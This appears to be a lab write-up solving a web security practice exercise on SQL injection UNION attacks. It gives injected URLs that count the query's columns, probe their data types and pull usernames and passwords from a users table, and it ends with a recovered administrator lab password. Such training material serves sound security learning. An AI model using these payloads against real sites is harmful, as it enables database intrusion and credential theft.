## SQL injection UNION attack, retrieving multiple values in a single column

1. main url: product category==>
https://0adf00b5034086f882ba2540008f001d.web-security-academy.net/filter?category=Gifts

2. find the number of columns in the original query by using the UNION operator with a different number of columns in each SELECT statement, for example:
https://0adf00b5034086f882ba2540008f001d.web-security-academy.net/filter?category=Gifts' union select null, null,null--

 3. find the data type of each column by using the UNION operator with different data types in each SELECT statement, for example:
 https://0adf00b5034086f882ba2540008f001d.web-security-academy.net/filter?category=Gifts' union select null,'users'--


4. retrieve data from other tables, for example, to retrieve the username and password from the users table, you can use the following query:

 https://0adf00b5034086f882ba2540008f001d.web-security-academy.net/filter?category=Gifts' union select null,username ||  ':' || password from users--

username = administrator
passwoed = 2f3fc454ii82yrwl4scx